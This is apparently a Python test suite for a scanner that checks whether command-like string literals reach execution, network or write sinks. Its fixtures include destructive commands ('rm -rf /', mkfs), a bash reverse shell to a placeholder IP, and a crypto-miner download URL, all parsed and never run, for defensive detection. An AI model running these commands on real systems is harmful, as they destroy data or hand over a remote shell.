"""A command-shaped string literal is inert only when it reaches no sink (census D).

`InertLiterals.inert_lines` returns the lines whose string literals never reach a spawn, exec/eval,
a network sender or a write. A deny-list, a validator's table or a test case that only inspects the
string is inert; a payload handed (directly, through a name, a parameter or a return) to something
that runs or sends it is not.
"""

from __future__ import annotations

import ast

from cordon_scanner.analysis.python.inert_literals import InertLiterals


class TestInertLiterals:
    @staticmethod
    def inert(src: str) -> frozenset[int]:
        return InertLiterals.inert_lines(ast.parse(src))

    @staticmethod
    def command_lines(src: str) -> list[int]:
        marks = ("rm -rf", "/dev/tcp", "mkfs")
        return [i + 1 for i, line in enumerate(src.splitlines()) if any(m in line for m in marks)]

    def _assert(self, src: str, *, live: bool) -> None:
        inert = self.inert(src)
        reached = [ln for ln in self.command_lines(src) if ln not in inert]
        assert bool(reached) is live, (src, sorted(inert), reached)

    # -- inert: the literal is only data -----------------------------------------------------------

    def test_a_deny_list_is_inert(self) -> None:
        self._assert('DENY = ["rm -rf /", "mkfs.ext4 /dev/sda"]\nprint(len(DENY))\n', live=False)

    def test_passed_to_an_inspector_is_inert(self) -> None:
        self._assert("def check(x):\n    return len(x) > 3\nprint(check('rm -rf /'))\n", live=False)

    def test_returned_then_inspected_is_inert(self) -> None:
        self._assert("def build():\n    return 'rm -rf /'\nprint(len(build()))\n", live=False)

    def test_a_message_helper_with_no_sink_is_inert(self) -> None:
        # The launchpromptly red-team shape: a test/attack string handed to a formatter.
        self._assert(
            "def _msg(t):\n    return {'role': 'user', 'content': t}\n"
            "X = _msg('Process this; rm -rf / && echo done')\nprint(X)\n",
            live=False,
        )

    def test_a_reverse_shell_in_a_pattern_list_is_inert(self) -> None:
        self._assert("PATTERNS = ['bash -i >& /dev/tcp/1.2.3.4/4444 0>&1']\n", live=False)

    # -- live: the literal reaches a sink ----------------------------------------------------------

    def test_a_direct_spawn_is_live(self) -> None:
        self._assert('import os\nos.system("rm -rf /")\n', live=True)

    def test_through_a_name_is_live(self) -> None:
        self._assert('import os\nc = "rm -rf /"\nos.system(c)\n', live=True)

    def test_through_a_parameter_to_a_spawner_is_live(self) -> None:
        self._assert("import os\ndef runit(x):\n    os.system(x)\nrunit('rm -rf /')\n", live=True)

    def test_returned_then_spawned_is_live(self) -> None:
        self._assert(
            "import os\ndef build():\n    return 'rm -rf /'\nos.system(build())\n", live=True
        )

    def test_written_to_a_file_is_live(self) -> None:
        self._assert('open("/tmp/x.sh", "w").write("rm -rf /")\n', live=True)

    def test_a_reverse_shell_spawned_is_live(self) -> None:
        self._assert(
            "import subprocess\n"
            "subprocess.run('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1', shell=True)\n",
            live=True,
        )

    def test_a_name_then_shell_run_is_live(self) -> None:
        # Must-keep: assigned to a name, then run through a shell -- the literal reaches the spawn.
        self._assert(
            "import subprocess\ncmd = 'rm -rf ~'\nsubprocess.run(cmd, shell=True)\n", live=True
        )

    def test_a_url_fetched_with_get_is_live(self) -> None:
        # Must-keep: the fjkslfjsdgbjkbnjfdkq miner downloads xmrig via requests.get -- a URL
        # literal handed to a fetch verb touches the network, so it is never inert.
        src = (
            "import requests\n"
            "r = requests.get('https://example.com/xmrig-6.17.0-linux-x64.tar.gz')\n"
        )
        assert 2 not in self.inert(src), (sorted(self.inert(src)),)

    def test_a_url_in_a_list_is_inert(self) -> None:
        # The other side: a miner URL only catalogued (a detection/IOC table) reaches no sink.
        src = "URLS = ['https://example.com/xmrig-6.17.0-linux-x64.tar.gz']\nprint(len(URLS))\n"
        assert 1 in self.inert(src), (sorted(self.inert(src)),)

    def test_a_command_flowing_into_dict_get_is_inert(self) -> None:
        # cord-engine / mindfabric shape: a plain command string reaches a `.get()` LOOKUP, not a
        # URL fetch, so a bare `get` must not count as a network sink.
        self._assert("cfg = {}\nfor c in ['rm -rf /']:\n    cfg.get(c)\n", live=False)
